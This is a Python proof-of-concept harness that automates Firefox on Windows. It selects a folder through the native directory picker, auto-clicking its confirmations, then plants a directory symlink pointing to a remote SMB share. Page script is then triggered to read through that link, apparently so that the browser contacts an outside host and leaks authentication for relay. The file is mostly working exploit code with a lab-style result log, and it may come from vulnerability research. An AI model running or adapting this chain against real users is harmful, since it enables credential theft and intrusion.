from __future__ import annotations

import http.server
import json
import os
import shutil
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from pathlib import Path

from pywinauto import Desktop, keyboard
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

ROOT = Path(__file__).resolve().parent
CONFIG = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
OUT = Path(os.environ.get("LAB_VICTIM_OUT", CONFIG.get("victim_out", "victim-out"))).resolve()
OUT.mkdir(parents=True, exist_ok=True)
BASE = Path(tempfile.gettempdir()) / f"firefox-local-relay-{CONFIG['run_id']}"
SELECTED = BASE / "selected"


def run(args, timeout=60):
    return subprocess.run(args, text=True, capture_output=True, timeout=timeout)


def start_http():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args): pass
    factory = lambda *args, **kwargs: Handler(*args, directory=str(ROOT), **kwargs)
    server = socketserver.TCPServer(("127.0.0.1", 0), factory)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, int(server.server_address[1])


def windows():
    try: return Desktop(backend="uia").windows()
    except Exception: return []


def select_folder(driver, path):
    result={"started":time.time()}
    driver.find_element(By.ID,"picker").click()
    dialog=None
    end=time.time()+25
    while time.time()<end and dialog is None:
        for w in windows():
            title=(w.window_text() or "").lower()
            if any(x in title for x in ("file upload","select folder","choose folder","upload")):
                dialog=w; break
        time.sleep(.2)
    if dialog is None:
        result["error"]="native picker not found"; return result
    result["dialog_title"]=dialog.window_text(); dialog.set_focus()
    try:
        keyboard.send_keys("^l"); time.sleep(.3)
        keyboard.send_keys(str(path),with_spaces=True); keyboard.send_keys("{ENTER}"); time.sleep(1)
        clicked=False
        for caption in ("Select Folder","Choose Folder","Open","Select"):
            try:
                b=dialog.child_window(title_re=rf"(?i)^{caption}$",control_type="Button")
                if b.exists(timeout=.3) and b.is_enabled(): b.click(); result["picker_button"]=caption; clicked=True; break
            except Exception: pass
        if not clicked: keyboard.send_keys("{ENTER}"); result["picker_button"]="ENTER"
    except Exception as exc: result["interaction_error"]=repr(exc)
    end=time.time()+25
    while time.time()<end:
        try:
            phase=driver.execute_script("return window.relayLab && window.relayLab.phase")
            if phase in ("selected","no-root"): result["page_phase"]=phase; return result
        except Exception: pass
        for w in windows():
            for caption in ("Upload","Allow","OK","Open"):
                try:
                    b=w.child_window(title_re=rf"(?i)^{caption}$",control_type="Button")
                    if b.exists(timeout=.05) and b.is_enabled(): b.click(); result.setdefault("confirmations",[]).append(caption)
                except Exception: pass
        time.sleep(.25)
    result["page_phase"]="timeout"; return result


def main():
    result={"run_id":CONFIG["run_id"],"started":time.time(),"verdict":"NOT_CONFIRMED"}
    driver=httpd=None
    try:
        shutil.rmtree(BASE,ignore_errors=True); SELECTED.mkdir(parents=True)
        (SELECTED/"inside.txt").write_text("INSIDE_ONLY")
        httpd,port=start_http(); result["page_port"]=port
        options=Options(); options.binary_location=CONFIG["firefox_binary"]
        for k,v in {"dom.webkitBlink.filesystem.enabled":True,"dom.webkitBlink.dirPicker.enabled":True,
                    "browser.shell.checkDefaultBrowser":False,"datareporting.policy.dataSubmissionEnabled":False}.items():
            options.set_preference(k,v)
        driver=webdriver.Firefox(options=options); result["capabilities"]=dict(driver.capabilities)
        result["parent_pid"]=driver.capabilities.get("moz:processID")
        driver.get(f"http://127.0.0.1:{port}/index.html"); time.sleep(1)
        result["picker"]=select_folder(driver,SELECTED)
        result["page_after_picker"]=driver.execute_script("return window.relayLab")

        link=SELECTED/"relay-link"
        target=r"\\ffrelay-lab\SHARE"
        proc=run(["cmd.exe","/d","/c","mklink","/D",str(link),target])
        result["link"]={"path":str(link),"target":target,"returncode":proc.returncode,
                        "stdout":proc.stdout,"stderr":proc.stderr,"lexists":os.path.lexists(link)}
        result["trigger_started"]=time.time()
        driver.set_script_timeout(25)
        try:
            result["browser_call"]=driver.execute_async_script(
                "const done=arguments[arguments.length-1]; window.triggerRelayPath('relay-link/probe.txt').then(done,e=>done({stage:'promise-error',error:String(e)}));")
        except Exception as exc:
            result["browser_call"]={"stage":"webdriver-error","error":repr(exc)}
        result["trigger_finished"]=time.time()
        time.sleep(12)
        result["page_final"]=driver.execute_script("return window.relayLab")
        driver.save_screenshot(str(OUT/"firefox.png"))
        result["verdict"]="FIREFOX_SMB_REPARSE_TRIGGER_ATTEMPTED"
    except Exception as exc:
        result.update(verdict="LAB_ERROR",error=repr(exc),traceback=traceback.format_exc())
    finally:
        result["finished"]=time.time()
        (OUT/"victim-result.json").write_text(json.dumps(result,indent=2,default=str))
        try:
            if driver: driver.quit()
        except Exception: pass
        try:
            if httpd: httpd.shutdown()
        except Exception: pass
    return 0

if __name__=="__main__": raise SystemExit(main())
